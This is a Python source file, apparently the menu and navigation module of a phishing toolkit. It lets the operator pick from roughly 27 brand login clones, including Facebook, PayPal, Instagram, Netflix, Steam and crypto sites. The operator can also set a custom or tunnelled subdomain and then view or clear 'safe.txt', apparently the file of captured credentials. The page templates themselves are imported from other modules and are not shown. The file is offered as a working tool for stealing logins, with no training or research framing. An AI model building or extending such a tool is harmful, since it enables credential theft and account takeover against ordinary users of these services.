#!/usr/bin/env python3
import os
import time
from .mens import *
from .files import *
from .pages import *
from .setup import *
####NAV#########################################################################
def get():
    try:
        i = int(input())
    except (NameError, SyntaxError, ValueError, TypeError):
        return 69
    return i
def get2():
    try:
        m = input()
        if not m:
            raise ValueError("default")
    except ValueError as e:
        return e
    return m
def start():
    showMain()
    r = get()
    while(r != 0):
        if(r == 1):
            phishMen()
        if(r == 2):
            users()
        if(r == 3):
            safe()
        if(r == 4):
            setup()
        if(r > 4 or r < 0):
            print ("Invalid option")
            time.sleep(0.7)
            os.system("clear")
        os.system("clear")
        showMain()
        r = get()

def phishMen():
    os.system("clear")
    showPhishMen()
    r = get()
    while(r != 0):
        if(r == 1):
            val = checkval();
            if val == False:
                fsetup();
            m = 'ng'
            phish(m)
        if(r == 2):
            print ("Enter custom subdomain name " + colored("(use special charecters at own risk)", "red"), end=": ")
            m = get2()
            phish(m)
        if(r > 2 or r < 0):
            print ("Invalid option")
            time.sleep(0.7)
            os.system("clear")
        os.system("clear")
        showPhishMen()
        r = get()

def phish(m):
    os.system("clear")
    showPhish()
    r = get()
    while(r != 0):
        if(r == 1):
            adobe(m)
            break
        if(r == 2):
            bandoo(m)
            break
        if(r == 3):
            devian(m)
            break
        if(r == 4):
            ebay(m)
            break
        if(r == 5):
            facebook(m)
            break
        if(r == 6):
            github(m)
            break
        if(r == 7):
            instagram(m)
            break
        if(r == 8):
            lin(m)
            break
        if(r == 9):
            space(m)
            break
        if(r == 10):
            netflix(m)
            break
        if(r == 11):
            origin(m)
            break
        if(r == 12):
            paypal(m)
            break
        if(r == 13):
            pint(m)
            break
        if(r == 14):
            twitt(m)
            break
        if(r == 15):
            pornhub(m)
            break
        if(r == 25):
            reddit(m)
            break
        if(r == 26):
            shop(m)
            break
        if(r == 18):
            spot(m)
            break
        if(r == 19):
            steam(m)
            break
        if(r == 20):
            sub(m)
            break
        if(r == 21):
            crypto(m)
            break
        if(r == 22):
            twitch(m)
            break
        if(r == 23):
            play(m)
            break
        if(r == 24):
            wordp(m)
            break
        if(r == 16):
            yahoo(m)
            break
        if(r == 17):
            yandex(m)
            break
        if(r == 27):
            custom(m)
            break
        if(r > 27 or r < 0):
            print ("Invalid option")
            time.sleep(0.7)
            os.system("clear")
            showPhish()
        r = get()
    os.system("clear")

def safe():
    os.system("clear")
    showSafe()
    r = get()
    while(r != 0):
        if(r == 1):
            c = confirm()
            if c == 1:
                os.system("echo > safe.txt")
                print("Cleared")
                time.sleep(1)
            else:
                pass
        if(r == 2):
            safeData()
        if(r > 2 or r < 0):
            print ("Invalid option")
            time.sleep(0.7)
        os.system("clear")
        showSafe()
        r = get()
    os.system("clear")
def confirm():
    print("Are you sure? (Y or N): ", end="")
    try:
        a = str(input())
        if a == "y" or a == "Y" or a == "yes" or a == "Yes":
            return 1
        else:
            return 0
    except (NameError, SyntaxError):
        return 0
